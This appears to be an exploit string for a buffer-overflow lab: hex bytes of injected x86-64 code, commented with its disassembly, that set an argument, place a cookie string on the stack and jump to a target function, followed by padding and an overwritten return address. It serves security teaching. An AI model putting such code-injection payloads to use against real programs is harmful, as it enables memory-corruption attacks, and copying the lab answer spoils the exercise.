bf bf e5 67 55       	/* mov    $0x5567e5bf,%edi */
48 b8 32 64 32 37 34 	/* movabs $0x3264323734333738,%rax */
33 37 38 
48 89 44 24 f7       	/* mov    %rax,-0x9(%rsp) */
48 83 ec 09          	/* sub    $0x9,%rsp */
68 90 18 40 00       	/* pushq  $0x401890 */
c3                   	/* retq */
00 00 00 00 00 00 00 00 00 00
98 e5 67 55 00 00 00 00 0a
